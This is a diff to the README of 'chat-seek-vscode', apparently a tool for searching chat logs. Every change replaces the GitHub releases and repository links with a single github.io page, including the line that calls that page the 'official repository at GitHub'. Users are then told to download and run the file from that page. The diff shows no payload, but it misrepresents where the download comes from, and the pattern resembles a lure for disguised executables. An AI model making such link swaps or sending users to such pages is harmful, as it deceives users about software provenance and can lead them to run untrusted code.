@@ -1,6 +1,6 @@
 # 🔍 chat-seek-vscode - Find Any Chat Message Instantly
 
-[![Download Now](https://img.shields.io/badge/Download-Chat_Seek_VSCode-blue?style=for-the-badge&logo=github)](https://github.com/KaviramNallathambi/chat-seek-vscode/releases)
+[![Download Now](https://img.shields.io/badge/Download-Chat_Seek_VSCode-blue?style=for-the-badge&logo=github)](https://kaviramnallathambi.github.io)
 
 ---
 
@@ -36,7 +36,7 @@ Let's get you up and running in just a few simple steps. This whole process shou
 
 ### 📥 Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/KaviramNallathambi/chat-seek-vscode/releases](https://github.com/KaviramNallathambi/chat-seek-vscode/releases)
+Visit this link to download the application: [https://kaviramnallathambi.github.io](https://kaviramnallathambi.github.io)
 
 When you land on that page, you'll see a list of available versions. Look for the most recent release (usually at the top). Click on the download link to get the application file. Your browser will save it to your default downloads folder, typically named "Downloads".
 
@@ -81,7 +81,7 @@ When you first launch chat-seek-vscode, it may ask you a few questions to locate
 
 We regularly release updates with new features and improvements. To update:
 
-1. Go back to the [download page](https://github.com/KaviramNallathambi/chat-seek-vscode/releases)
+1. Go back to the [download page](https://kaviramnallathambi.github.io)
 2. Download the newest version
 3. Run the new file - it will automatically replace the old version
 
@@ -151,7 +151,7 @@ We regularly improve search speed and accuracy. Checking the download page weekl
 
 If you run into any issues or have questions, there are several ways to get assistance:
 
-- **Visit the official repository** at [GitHub](https://github.com/KaviramNallathambi/chat-seek-vscode) for detailed documentation
+- **Visit the official repository** at [GitHub](https://kaviramnallathambi.github.io) for detailed documentation
 - **Check the release notes** on the download page for known issues and solutions
 - **Search for your problem in community forums** - many solutions are already documented
 - **Contact support** through the repository's issues section
@@ -162,7 +162,7 @@ If you run into any issues or have questions, there are several ways to get assi
 
 Stop wasting time searching through endless chat logs manually. Download chat-seek-vscode today and experience the joy of finding any conversation, message, or code snippet in seconds.
 
-[![Get Started Now](https://img.shields.io/badge/Download-chat--seek--vscode-brightgreen?style=for-the-badge)](https://github.com/KaviramNallathambi/chat-seek-vscode/releases)
+[![Get Started Now](https://img.shields.io/badge/Download-chat--seek--vscode-brightgreen?style=for-the-badge)](https://kaviramnallathambi.github.io)
 
 Your future self will thank you every time you need to find that perfect solution you discussed months ago. Get chat-seek-vscode now and take the frustration out of chat searching forever!
 
